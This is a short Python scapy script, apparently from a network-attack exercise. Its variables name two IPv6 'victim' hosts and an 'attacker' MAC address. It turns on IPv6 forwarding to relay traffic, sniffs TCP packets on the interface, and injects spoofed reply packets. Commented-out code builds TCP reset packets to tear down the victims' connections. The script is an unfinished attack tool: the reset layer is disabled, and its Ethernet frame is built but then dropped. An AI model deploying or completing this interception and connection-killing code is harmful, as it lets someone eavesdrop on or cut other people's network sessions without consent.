import os
os.environ['http_proxy'] = ''
from scapy.all import *

ipv6_vitima01 = "2001:db8:0:1:c966:e1f7:3ae8:76b9"
ipv6_vitima02 = "2001:1bcd:123:1:ac02:ae48:93da:f43e"
mac_atacante = "a4:1f:72:f5:90:50"

os.system('echo 1 > /proc/sys/net/ipv6/conf/all/forwarding')



def pkgs(pkg):
	pkg.show()
	resp=IPv6(dst=pkg[IPv6].src,src=pkg[IPv6].dst)#/TCP(dport=pkg[IPv6][TCP].sport,sport=pkg[IPv6][TCP].dport,flags="RA",seq=pkg[IPv6][TCP].ack,ack=pkg[IPv6][TCP].seq+(len(pkg[IPv6][TCP].payload) if pkg.getlayer(Raw) else 1))
	resp=Ether(dst=pkg.src, src=pkg.dst)# / resp
	resp.show()
	send(resp,count=2,verbose=5, iface = 'enp4s0')

def isMyPacket (pkt):
	return IPv6 in pkt and TCP in pkt[IPv6]
	#return IPv6 in pkt and pkt[IPv6].src in [ipv6_vitima01, ipv6_vitima02] and pkt[IPv6].dst in [ipv6_vitima01, ipv6_vitima02] and TCP in pkt[IPv6]

if __name__=="__main__":
	conf.L3socket=L3RawSocket
	sniff(lfilter=isMyPacket,iface="enp4s0",prn=pkgs,store=0)
